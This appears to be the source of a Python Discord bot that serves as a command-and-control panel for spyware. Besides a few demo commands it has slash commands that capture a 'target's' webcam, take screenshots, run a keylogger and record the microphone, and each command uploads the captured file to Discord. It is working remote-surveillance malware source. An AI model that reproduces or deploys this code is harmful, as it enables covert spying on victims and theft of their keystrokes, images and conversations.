import discord
import os
import asyncio
from dotenv import load_dotenv
from discord.ext import commands
# import aiofiles
import webcam
import screencapture
import keylogger
import MicrophoneTap

load_dotenv()

guild_id_env = os.getenv("DISCORD_GUILD_ID")

intents = discord.Intents.default()
intents.message_content = True

GUILD_ID = discord.Object(id=guild_id_env)

class Client(commands.Bot):
    async def on_ready(self):
        print(f'Logged on as {self.user}!')

        try: 
            guild = discord.Object(id=guild_id_env)
            synced = await self.tree.sync(guild=guild)
            print(f'Synced {len(synced)} commands to guild {guild.id}')

        except Exception as e:
            print(f'Error syncing commands: {e}')

    async def on_message(self, message):
        if message.author == self.user:
            return
        
        if message.content.startswith('hello'):
            await message.channel.send(f'Hou je kanis, {message.author}!')

        if 'bek' in message.content:
            await message.channel.send(f'Nee, jij bent een bek!')


client = Client(command_prefix='!', intents=intents)

@client.tree.command(name='help', description='I cant help you', guild=GUILD_ID)
async def sayHelp(interaction: discord.Interaction):
    await interaction.response.send_message('Too bad')

@client.tree.command(name='embed', description='Embed demo', guild=GUILD_ID)
async def printer(interaction: discord.Interaction):
    embed = discord.Embed(title='SmolGeorgie Github', url='https://github.com/smolgeorgie', description='My github page! Check it out!', color=discord.Color.green())
    embed.set_thumbnail(url='https://cdn.pixabay.com/photo/2022/01/30/13/33/github-6980894_1280.png')
    embed.add_field(name='Repo', value='Star my repositories!', inline=True)
    embed.add_field(name='Follow', value='Follow me on github!')
    embed.set_author(name=interaction.user.name)
    await interaction.response.send_message(embed=embed)

class View(discord.ui.View):
    @discord.ui.button(label='Click me', style=discord.ButtonStyle.green, emoji='🫥')
    async def button_callback(self, button, interaction):
        await button.response.send_message('You have clicked the button')
    
@client.tree.command(name='button', description='Ugly button', guild=GUILD_ID)
async def myButton(interaction: discord.Interaction):
    await interaction.response.send_message(view=View())

@client.tree.command(name="webcam", description="Capture an image from the target's webcam", guild=GUILD_ID)
async def showcam(interaction: discord.Interaction):
    await interaction.response.defer()  # Defer the response to avoid timeout
    cam = webcam.webcam()
    activ, retcode = await cam.activate()
    if type(activ) != str:
        imgsaved = await cam.save(activ)
        print(imgsaved)
        await cam.release(activ)
        await interaction.followup.send(file=discord.File(cam.out_name))
    else:
        await interaction.followup.send(content="Failed to activate webcam: " + retcode)

@client.tree.command(name="screenshot", description="Take a screenshot of the users's current display", guild=GUILD_ID)
async def screenshot(interaction: discord.Interaction):
    await interaction.response.defer()
    sshot = screencapture.screencapture()
    if sshot.out_name != "":
        imgsaved = sshot.out_name
        print(imgsaved)
        await interaction.followup.send(file=discord.File(imgsaved))
    else:
        await interaction.followup.send(content="Failed to capture a screenshot!")

@client.tree.command(name="keylog", description="Start a keylogger for n seconds. Defaults to 60 seconds", guild=GUILD_ID)
async def keylog(interaction: discord.Interaction, duration: int=60):
    print(interaction, duration)
    await interaction.response.defer()
    curDir = os.getcwd()
    klog = keylogger.keylogger(duration)
    logfile = klog.logname
    klog.start()
    if klog.finished == True:
        try:
            await interaction.followup.send(file=discord.File("{0}\\logs\\{1}".format(curDir,logfile)))
        except Exception:
            await interaction.followup.send(file=discord.File(".\\Python\\logs\\{}".format(logfile)))

@client.tree.command(name="microphone", description="Start listening to the user's microphone for n seconds. Defaults to 60 seconds", guild=GUILD_ID)
async def mictap(interaction: discord.Interaction, duration: int=60):
    print(interaction, duration)
    await interaction.response.send_message(content="Okiedokie! Listening for {} seconds".format(duration))
    # Get the original response message
    GetMsg = await interaction.original_response()
    print(GetMsg)
    
    curDir = os.getcwd()
    micTap = MicrophoneTap.MicrophoneTap(duration)
    audioFile = micTap.activate()

    if audioFile:
        # Send the audio file as an attachment
        await interaction.followup.send(file=discord.File("{0}\\{1}".format(curDir, audioFile)))

token = os.getenv('DISCORD_BOT_TOKEN')
client.run(token)